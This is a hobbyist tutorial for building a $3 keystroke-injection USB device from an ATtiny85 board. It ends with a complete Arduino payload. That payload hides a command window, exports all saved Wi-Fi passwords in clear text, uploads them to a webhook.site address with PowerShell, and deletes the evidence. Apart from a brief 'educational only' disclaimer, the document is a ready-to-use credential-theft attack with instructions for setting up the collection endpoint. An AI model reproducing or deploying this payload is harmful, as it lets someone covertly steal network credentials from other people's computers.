# At-Home-Rubber-Ducky
Below is how you can create your own Rubber Ducky for just $3. 

## First thing first
This is for educational purposes ONLY! Do not use this to steal Wi-Fi passwords without permission. I am not liable for your misuse. 

### Now that that's out of the way

This is how you create your own Rubber Ducky for just $3. Hak5 is AMAZING, so please buy their stuff. If you can't afford it, here's how you can do it on your own.

### Step One: Attiny85 Micro USB

You can buy this from Amazon. A pack of 5 is around $16. https://www.amazon.com/dp/B0836WXQQR/ref=cm_sw_r_tw_dp_A5PPTYEPXT6SYT50JM02

### Step Two: Arduino Software

Attiny85 Micro USB works with Arduino. Installation is straightforward. Agree, click next, and download. 

https://www.arduino.cc/en/software

### Step Three: Configuration of Arduino

Once Arduino is installed and running, go to File > Preferences. From here, go to Additional Board Manager URLs, and copy in: http://digistump.com/package_digistump_index.json
Next, go to Tools > Board > Board Manager. Search for Digispark, and install Digistump AVR Boards.

### Step Four: Download Digistump Arduino Drivers

Go to https://github.com/digistump/DigistumpArduino/releases, and download the zip file. Unzip it, and run the Install Drivers application

### Step Five: Finally, the Payloads

Go to https://github.com/MTK911/Attiny85/tree/master/payloads, and click Wi-Fi Password Stealer. I prefer the WifiKey-Grab_Minimize-of-Shame.ino, but choose your favorite. I made slight changes to the code, increasing the delay, and adding "Fi" to some "-Wi-Fi" portions, and I will show you here:

>/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); //going to temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Select-String -Path Wi-Fi* -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-Fi* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
  

### Step Six: Webhook.site

Go to https://webhook.site and get your own personalized webhook uri. 

 
